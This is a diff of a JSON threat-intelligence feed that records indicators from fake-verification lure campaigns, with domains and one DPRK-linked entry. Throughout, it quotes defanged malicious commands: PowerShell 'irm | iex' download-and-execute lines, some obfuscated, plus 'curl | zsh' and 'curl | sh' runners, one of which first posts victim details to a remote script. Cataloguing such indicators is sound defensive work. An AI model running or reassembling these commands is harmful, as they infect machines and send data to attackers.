@@ -12177,10 +12177,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -32417,9 +32419,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
+    "holodeo.net",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -35082,12 +35088,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "echo '[encoded]' | base64 -d | zsh"
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
-    "entitlementcheck.pro"
+    "entitlementcheck.pro",
+    "github.pw"
    ],
    "lure_from": [
     "interseq.at"
@@ -36447,14 +36453,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "github.pw",
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -36929,15 +36936,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
     "xorados.com",
     "trek-72.com",
-    "entitlementcheck.pro"
+    "github.pw",
+    "entitlementcheck.pro",
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -37204,15 +37212,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
     "xorados.com",
     "trek-72.com",
-    "entitlementcheck.pro"
+    "github.pw",
+    "entitlementcheck.pro",
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -37774,9 +37783,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "curl -sL -d \"id=87dc5c56-cce3-42b3-b70e-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fbancocedula-online.com%2F&os=Mac%2015&lastVisitAt=2026-11-12T23%3A47%3A55.426Z&lastShellAt=2026-11-12T23%3A47%3A55.426Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -sL -d \"id=190ec190-bffe-4e7c-acb2-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fbancocedula-online.com%2F&os=Mac%2015&lastVisitAt=2026-11-18T19%3A28%3A31.273Z&lastShellAt=2026-11-18T19%3A28%3A31.273Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -106172,14 +106181,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
+    "j7tracker.gb.net",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "github.pw"
    ],
    "lure_from": [
     "interseq.at"
@@ -142149,19 +142159,21 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "github.pw",
     "xorados.com",
     "trek-72.com",
+    "j7tracker.gb.net",
+    "holodeo.net",
     "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
-    "ncheck-brows.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "ncheck-brows.beer"
    ]
   },
   {
@@ -167459,21 +167471,21 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
-    "groverudder12.com",
     "hagosuro.lc",
+    "groverudder12.com",
     "trek-72.com",
     "jscdncloude.beer",
+    "j7tracker.gb.net",
     "github.pw",
     "t-trustresnew.com",
-    "lepafonso.bz",
-    "trustchecknes.com"
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at"
@@ -223673,8 +223685,8 @@
     "jscdncloude.beer",
     "github.pw",
     "cloud-browse.codes",
-    "t-trustresnew.com",
-    "lepafonso.bz"
+    "j7tracker.gb.net",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -248665,11 +248677,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'ks6hfxij[.]flex0[.]store/?ublib=01d26f06-d24b-4b88-b575-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX",
+    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "ks6hfxij.flex0.store"
+   ],
    "lure_from": []
   },
   {
@@ -252555,6 +252569,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "yx60w1y1.flex0.store",
     "qpt40c82.gamev.store",
     "cpe2umdg.kevg.store",
     "gmsmvi8a.bodes.store"
@@ -252621,6 +252636,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "irf87xbl.flex0.store",
     "9csynpn7.gamev.store",
     "k52yga98.kevg.store",
     "9735l2we.bodes.store"
@@ -252694,6 +252710,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "4d7hjplf.flex0.store",
     "ont8ljgn.gamev.store",
     "hv1vio2f.kevg.store",
     "rpmquwga.bodes.store"
@@ -252819,6 +252836,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "s73mtd8l.flex0.store",
     "161zbbgz.gamev.store",
     "4z7xvzjg.kevg.store",
     "vlu572o4.bodes.store"
@@ -253351,6 +253369,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "wvsamk79.flex0.store",
     "xqinvxy7.gamev.store",
     "g8rhisn1.kevg.store",
     "diuailc9.bodes.store"
@@ -255122,6 +255141,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "qwkurq56.flex0.store",
     "ul3xpeph.gamev.store",
     "jtpvluqy.kevg.store",
     "7vmpejpu.bodes.store"
@@ -257184,6 +257204,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "xitvrv86.flex0.store",
     "1iuyg01j.gamev.store",
     "o55kieih.kevg.store",
     "fj0yp6am.bodes.store"
@@ -257236,6 +257257,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "ti4ru63x.flex0.store",
     "jzrpuab7.gamev.store",
     "q1f5sktc.kevg.store",
     "ok97a4re.bodes.store"
@@ -257288,6 +257310,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "mbpcws52.flex0.store",
     "dbz30i7u.gamev.store",
     "yvyzqbav.kevg.store",
     "5prhe18d.bodes.store"
@@ -257340,6 +257363,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "aa92psyi.flex0.store",
     "6wqifpgg.gamev.store",
     "q0zn8dih.kevg.store",
     "6bmbzunu.bodes.store"
@@ -258113,6 +258137,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "b4jqim25.flex0.store",
     "e4pbm5zn.gamev.store",
     "1ewo10u8.kevg.store",
     "vwcse4sx.bodes.store"
@@ -258690,6 +258715,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "y1c27bj4.flex0.store",
     "qx6bgm61.gamev.store",
     "b70opc3b.kevg.store",
     "ryqy53xj.bodes.store"
@@ -266766,8 +266792,8 @@
    "lure_from": [
     "api.ipquery.io",
     "tdssecure.beer",
-    "fhhiios.online",
     "interseq.at",
+    "fhhiios.online",
     "securetds.beer",
     "fddsc.motorcycles"
    ]
